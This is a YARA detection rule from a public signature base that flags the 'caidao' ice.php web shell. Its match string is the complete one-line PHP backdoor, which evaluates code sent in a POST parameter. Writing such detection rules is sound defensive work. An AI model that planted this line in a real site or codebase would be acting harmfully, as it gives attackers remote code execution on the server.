rule webshell_caidao_shell_ice_2
{
	meta:
		description = "Web Shell - file ice.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1d6335247f58e0a5b03e17977888f5f2"
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword

	condition:
		all of them
}
